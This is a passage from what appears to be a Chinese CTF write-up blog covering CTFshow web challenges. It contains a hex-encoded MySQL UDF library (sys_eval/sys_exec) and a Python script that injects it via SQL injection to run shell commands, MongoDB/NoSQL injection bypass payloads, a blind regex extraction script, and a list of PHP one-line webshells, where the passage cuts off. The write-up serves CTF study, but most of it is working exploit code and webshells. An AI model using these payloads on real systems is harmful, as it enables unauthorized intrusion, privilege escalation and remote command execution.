100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">21510</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    end <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">5000</span>    payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>udf<span class="token punctuation">[</span>i<span class="token punctuation">:</span>end<span class="token punctuation">]</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token builtin">zip</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> t <span class="token keyword">in</span> text<span class="token punctuation">:</span>    url <span class="token operator">=</span> base_url <span class="token operator">+</span> <span class="token string">"?id=';select unhex('&#123;&#125;') into dumpfile '/usr/lib/mariadb/plugin/&#123;&#125;.txt'--+&amp;page=1&amp;limit=10"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>        p<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">,</span> t<span class="token punctuation">)</span>  <span class="token comment"># UDF提权一般配合dumpfile 而不是outfile</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>next_url <span class="token operator">=</span> base_url <span class="token operator">+</span> <span class="token string">"?id=';select concat(load_file('/usr/lib/mariadb/plugin/a.txt'),load_file('/usr/lib/mariadb/plugin/b.txt'),load_file('/usr/lib/mariadb/plugin/c.txt'),load_file('/usr/lib/mariadb/plugin/d.txt'),load_file('/usr/lib/mariadb/plugin/e.txt')) into dumpfile '/usr/lib/mariadb/plugin/udf.so'-- +&amp;page=1&amp;limit=10"</span>  <span class="token comment"># 将各个txt文件合并到udf.so</span>rn <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>next_url<span class="token punctuation">)</span>uaf_url <span class="token operator">=</span> base_url <span class="token operator">+</span> <span class="token string">"?id=';CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';--+"</span>  <span class="token comment"># 创建udf函数</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>uaf_url<span class="token punctuation">)</span>nn_url <span class="token operator">=</span> base_url <span class="token operator">+</span> <span class="token string">"?id=';select sys_eval('cat /flag.*');-- +&amp;page=1&amp;limit=10"</span>  <span class="token comment"># 执行命令并查看</span>rnn <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>nn_url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>rnn<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><h4 id="web249-nosql"><a href="#web249-nosql" class="headerlink" title="web249(nosql)"></a>web249(nosql)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$memcache</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><a href="https://www.anquanke.com/post/id/97211">冷门知识 — NoSQL注入知多少</a></p><p><a href="http://rui0.cn/archives/609">NoSQL注入小笔记</a></p><p><strong>Memcached get</strong> 命令获取存储在 <strong>key(键)</strong> 中的 <strong>value(数据值)</strong> ，如果 key 不存在，则返回空。</p><p>补充一下知识：</p><pre class="language-sql" data-language="sql"><code class="language-sql">$gt : <span class="token operator">></span>$lt : <span class="token operator">&lt;</span>$gte: <span class="token operator">>=</span>$lte: <span class="token operator">&lt;=</span>$ne : <span class="token operator">!=</span>、<span class="token operator">&lt;></span>$<span class="token operator">in</span> : <span class="token operator">in</span>$nin: <span class="token operator">not</span> <span class="token operator">in</span>$<span class="token keyword">all</span>: <span class="token keyword">all</span> $<span class="token operator">or</span>:<span class="token operator">or</span>$<span class="token operator">not</span>: 反匹配<span class="token punctuation">(</span><span class="token number">1.3</span><span class="token number">.3</span>及以上版本<span class="token punctuation">)</span>模糊查询用正则式：db<span class="token punctuation">.</span>customer<span class="token punctuation">.</span>find<span class="token punctuation">(</span>&#123;<span class="token string">'name'</span>: &#123;<span class="token string">'$regex'</span>:<span class="token string">'.*s.*'</span>&#125; &#125;<span class="token punctuation">)</span><span class="token comment">/*** : 范围查询 &#123; "age" : &#123; "$gte" : 2 , "$lte" : 21&#125;&#125;* : $ne &#123; "age" : &#123; "$ne" : 23&#125;&#125;* : $lt &#123; "age" : &#123; "$lt" : 23&#125;&#125;*/</span><span class="token comment">//查询age = 22的记录</span>db<span class="token punctuation">.</span>userInfo<span class="token punctuation">.</span>find<span class="token punctuation">(</span>&#123;<span class="token string">"age"</span>: <span class="token number">22</span>&#125;<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//相当于：select * from userInfo where age = 22;</span><span class="token comment">//查询age > 22的记录</span>db<span class="token punctuation">.</span>userInfo<span class="token punctuation">.</span>find<span class="token punctuation">(</span>&#123;age: &#123;$gt: <span class="token number">22</span>&#125;&#125;<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//相当于：select * from userInfo where age > 22;</span></code></pre><p><code>id=flag</code> 不行，id 都是数字，尝试数组绕过得到 flag <code>id[]=flag</code></p><h4 id="web250-MongoDB"><a href="#web250-MongoDB" class="headerlink" title="web250(MongoDB)"></a>web250(MongoDB)</h4><p>sql语句</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Query</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cursor</span> <span class="token operator">=</span> <span class="token variable">$manager</span><span class="token operator">-></span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ctfshow.ctfshow_user'</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </code></pre><p>返回逻辑</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//无过滤</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$cursor</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'登陆成功'</span><span class="token punctuation">;</span>  <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    </code></pre><p>MongoDB是NOSQL的一种，介绍一下Mongodb得两个操作符：<br><code>$ne</code>：!&#x3D; 不等于<br><code>$regex</code>：正则匹配</p><pre class="language-php" data-language="php"><code class="language-php">username<span class="token punctuation">[</span><span class="token variable">$ne</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>password<span class="token punctuation">[</span><span class="token variable">$ne</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span>username<span class="token punctuation">[</span><span class="token variable">$regex</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">.</span><span class="token operator">&amp;</span>password<span class="token punctuation">[</span><span class="token variable">$regex</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">.</span></code></pre><p>如果输入<code>value[$ne]=1</code>也就意味着<code>value=array($ne=&gt;1)</code>，在MongoDB中，原来的一个单个目标的查询变成了条件查询。同样的，我们也可以使用<code>username[$gt]=&amp;password[$gt]=</code>作为payload进行攻击。</p><h4 id="web251"><a href="#web251" class="headerlink" title="web251"></a>web251</h4><p>同上</p><h4 id="web252"><a href="#web252" class="headerlink" title="web252"></a>web252</h4><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment">//sql</span>db<span class="token punctuation">.</span>ctfshow_user<span class="token punctuation">.</span>find<span class="token punctuation">(</span>&#123;username:<span class="token string">'$username'</span><span class="token punctuation">,</span>password:<span class="token string">'$password'</span>&#125;<span class="token punctuation">)</span><span class="token punctuation">.</span>pretty<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>同时不能是 admin和 admin1，正则绕过<br>payload: <code>username[$regex]=^[^admin].*&amp;password[$ne]=1</code></p><h4 id="web253"><a href="#web253" class="headerlink" title="web253"></a>web253</h4><p>username&#x3D;flag时返回登陆成功，但没有密码，考虑盲注爆出密码</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'https://2eb32fc2-5457-44b4-b948-b0c416a768c8.challenge.ctf.show/api/'</span>flag <span class="token operator">=</span> <span class="token string">''</span>flag_dic <span class="token operator">=</span> <span class="token string">"ctfshow&#123;&#125;1234567890-poiuytrrewqasdfghjklmnbvcxz"</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> flag_dic<span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username[$regex]"</span><span class="token punctuation">:</span> <span class="token string">"flag"</span><span class="token punctuation">,</span>            <span class="token string">"password[$regex]"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token operator">+</span>i<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"登陆成功"</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> flag<span class="token operator">+</span>i            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">'&#125;'</span><span class="token punctuation">:</span>                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> Sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web入门-upload</title>
      <link href="/2024/07/02/web%E5%85%A5%E9%97%A8-upload/"/>
      <url>/2024/07/02/web%E5%85%A5%E9%97%A8-upload/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><a href="https://blog.csdn.net/qq_43390703/article/details/104858705">文件上传漏洞 (上传知识点、题型总结大全-upload靶场全解)</a></p><h4 id="产生文件上传漏洞的原因"><a href="#产生文件上传漏洞的原因" class="headerlink" title="产生文件上传漏洞的原因"></a>产生文件上传漏洞的原因</h4><p><strong>原因：</strong></p><ul><li>对于上传文件的后缀名（扩展名）没有做较为严格的限制</li><li>对于上传文件的MIMETYPE(用于描述文件的类型的一种表述方法) 没有做检查</li><li>权限上没有对于上传的文件目录设置不可执行权限，（尤其是对于shebang类型的文件）</li><li>对于web server对于上传文件或者指定目录的行为没有做限制</li></ul><p><strong>原理：</strong><br>在 WEB 中进行文件上传的原理是通过将表单设为 multipart&#x2F;form-data，同时加入文件域，而后通过 HTTP 协议将文件内容发送到服务器，服务器端读取这个分段 (multipart) 的数据信息，并将其中的文件内容提取出来并保存的。通常，在进行文件保存的时候，服务器端会读取文件的原始文件名，并从这个原始文件名中得出文件的扩展名，而后随机为文件起一个文件名 ( 为了防止重复 )，并且加上原始文件的扩展名来保存到服务器上</p><p>文件上传后导致的常见安全问题一般有:</p><ul><li><p>上传文件是Web脚本语言，服务器的Web容器解释并执行了用户上传的脚本,导致代<br>码执行;</p></li><li><p>上传文件是Flash的策略文件crossdomain.xml,黑客用以控制Flash在该域下的行为(其<br>他通过类似方式控制策略文件的情况类似);</p></li><li><p>上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行:</p></li><li><p>上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执<br>行，被用于钓鱼和欺诈。</p></li><li><p>除此之外，还有一些不常见的利用方法，比如将上传文件作为一个入口,溢出服务器的后台处理程序，如图片解析模块;或者上传-一个合法的文本文件， 其内容包含了PHP脚本，再通过“本地文件包含漏洞(Local File Include)”执行此脚本;等等。此类问题不在此细述。</p></li></ul><h4 id="常用的一句话木马"><a href="#常用的一句话木马" class="headerlink" title="常用的一句话木马"></a>常用的一句话木马</h4><pre class="language-php" data-language="php"><code class="language-php">##PHP：<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'r00ts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">assert</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span>cmd<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//?cmd=phpinfo() @preg_replace("/abc/e",$_REQUEST['cmd'],"abcd"); </span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//?cmd=phpinfo();</span><span class="token variable">$func</span> <span class="token operator">=</span><span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//?func=system&amp;cmd=whoami</span><span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'func'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$cmd</span><span class="token punctuation">;</span><span class="token variable">$new_array</span><span class="token operator">=</span><span class="token function">array_map</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//print_r($new_array);</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//?cmd=phpinfo()</span>@<span class="token function">call_user_func</span><span class="token punctuation">(</span>assert<span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//?cmd=phpinfo()</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$cmd</span><span class="token punctuation">;</span><span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"assert"</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">//?func=system&amp;cmd=whoami</span><span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array1</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$func</span> <span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'func'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">array_filter</span><span class="token punctuation">(</span><span class="token variable">$array1</span><span class="token punctuation">,</span><span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">usort</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'asse'</span><span class="token operator">.</span><span class="token string single-quoted-string">'rt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> php环境>=&lt;5.6才能用<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">usort</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>  php环境>=5.6才能用<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token punctuation">(</span><span class="token variable">$_</span><span class="token operator">=</span>@<span class="token 